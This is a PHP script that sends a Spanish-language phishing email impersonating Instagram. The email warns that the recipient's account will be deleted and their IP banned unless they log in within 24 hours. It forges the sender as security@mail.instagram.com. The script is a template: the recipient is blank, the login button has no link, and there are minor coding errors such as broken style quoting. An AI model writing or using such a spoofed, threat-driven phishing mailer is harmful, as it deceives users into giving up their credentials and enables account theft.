<?php
$Email="";
$para      = $Email;
$titulo    = 'Cuenta eliminada Instagram';
$mensaje   = "
<html>
    <head>
        <link href='https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet'>
        
    </head>
    
    <body>
      <header>
         <center>
          <img src='img/i.png'alt='Girl in a jacket' width='158' height='33'> 
        </center>
      </header>
       <center>
        <p style='font-family: 'Roboto', sans-serif; margin: 10px; color: #565A5C; font-size: 21px;'>
        Su cuenta sera eliminada por multiples infracciones a nuestros terminos y condiciones, inicie sesion y conteste nuestro formulurio dentro de las proximas 24hs o su cuenta ay direccion IP seran baneadas permanentemente
        </p>
        <p style=''    border-collapse: collapse;
                      border-radius: 3px;
                      text-align: center;
                      display: block;
                      border: solid 1px #009fdf;
                      padding: 10px 16px 14px 16px;
                      margin: 0 2px 0 auto;
                      min-width: 80px;
                      background-color: #47a2ea;'>
       <span style='color: aliceblue'>iniciar sesion</span>
       </p>
       <p style='font-family: 'Roboto', sans-serif; margin: 10px; color: #565A5C; font-size: 21px;'>
         desde el equipo directivo de instagram le deseamos un buen dia
        </p>
        </center>
    </body>
</html>
    


" ;
$cabeceras = 'From: security@mail.instagram.com' . "\r\n" .
    'Reply-To:tsecurity@mail.instagram.com' . phpversion();

mail($para, $titulo, $mensaje, $cabeceras);
?>